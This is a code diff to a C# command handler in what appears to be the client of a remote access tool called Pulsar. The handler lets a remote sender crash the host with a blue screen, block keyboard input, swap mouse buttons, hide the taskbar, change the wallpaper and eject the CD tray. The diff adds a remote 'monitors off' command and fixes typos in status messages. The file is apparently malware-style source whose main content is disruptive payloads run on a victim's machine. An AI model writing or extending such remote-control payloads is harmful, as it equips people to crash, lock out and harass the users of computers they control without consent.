@@ -16,7 +16,8 @@ namespace Pulsar.Client.Messages
         private SwapMouseButtons _swapMouseButtons = new SwapMouseButtons();
         private HideTaskbar _hideTaskbar = new HideTaskbar();
         private KeyboardInput _keyboardInput = new KeyboardInput();
-        private CDTray _cdTray = new CDTray(); // Added CD tray handler
+        private CDTray _cdTray = new CDTray();
+        private MonitorPower _monitorPower = new MonitorPower(); // Added monitor handler
 
         public bool CanExecute(IMessage message) =>
             message is DoBSOD ||
@@ -24,7 +25,8 @@ namespace Pulsar.Client.Messages
             message is DoHideTaskbar ||
             message is DoChangeWallpaper ||
             message is DoBlockKeyboardInput ||
-            message is DoCDTray; // Added support for DoCDTray
+            message is DoCDTray ||
+            message is DoMonitorsOff; // Added support for monitor messages
 
         public bool CanExecuteFrom(ISender sender) => true;
 
@@ -47,13 +49,16 @@ namespace Pulsar.Client.Messages
                 case DoBlockKeyboardInput msg:
                     Execute(sender, msg);
                     break;
-                case DoCDTray msg: // Added case for CD tray
+                case DoCDTray msg:
+                    Execute(sender, msg);
+                    break;
+                case DoMonitorsOff msg: // Added case for monitor power
                     Execute(sender, msg);
                     break;
             }
         }
 
-        private void Execute(ISender client, DoCDTray message) // Added method
+        private void Execute(ISender client, DoCDTray message)
         {
             try
             {
@@ -66,9 +71,22 @@ namespace Pulsar.Client.Messages
             }
         }
 
+        private void Execute(ISender client, DoMonitorsOff message) // New method
+        {
+            try
+            {
+                _monitorPower.Handle(message);
+                client.Send(new SetStatus { Message = $"Monitors turned {(message.Off ? "off" : message.On ? "on" : "no action")} successfully" });
+            }
+            catch (Exception ex)
+            {
+                client.Send(new SetStatus { Message = $"Failed to change monitor state: {ex.Message}" });
+            }
+        }
+
         private void Execute(ISender client, DoBSOD message)
         {
-            client.Send(new SetStatus { Message = "Successfull BSOD" });
+            client.Send(new SetStatus { Message = "Successful BSOD" });
             _bsod.DOBSOD();
         }
 
@@ -89,7 +107,7 @@ namespace Pulsar.Client.Messages
         {
             try
             {
-                client.Send(new SetStatus { Message = "Successfull Hide Taskbar" });
+                client.Send(new SetStatus { Message = "Successful Hide Taskbar" });
                 HideTaskbar.DoHideTaskbar();
             }
             catch
@@ -104,7 +122,7 @@ namespace Pulsar.Client.Messages
             {
                 string imagePath = SaveImageToFile(message.ImageData, message.ImageFormat);
                 ChangeWallpaper.SetWallpaper(imagePath);
-                client.Send(new SetStatus { Message = "Successfull Wallpaper Change" });
+                client.Send(new SetStatus { Message = "Successful Wallpaper Change" });
             }
             catch
             {
